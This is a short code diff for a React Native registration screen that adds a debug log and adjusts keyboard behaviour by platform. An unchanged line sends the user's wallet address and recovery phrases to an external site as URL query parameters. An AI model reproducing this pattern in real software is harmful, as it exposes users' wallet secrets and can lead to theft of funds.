@@ -121,6 +121,7 @@ export const Register = ({navigation}) => {
         dispatch(clearAuth())
     },[])
     useEffect(()=>{
+        console.log('sss')
         if(auth?.data?.success){
             setPopUp(true)
             Linking.openURL(`https://usdtscan.com/download_keys?walet=${auth.data.Wallet}&phrase1=${auth.data.recovery_word}&phrase2=${auth.data.recovery_word2}`)
@@ -129,7 +130,7 @@ export const Register = ({navigation}) => {
             setPopUp(false)
         }
     },[auth?.data?.success])
-     return <KeyboardAvoidingView  behavior="padding"> 
+     return <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : 'height'}> 
     <LoginWrapper 
                 validate = {()=>Validate()}  
                 onChange={(i,value)=>handleChange(i,value)} 
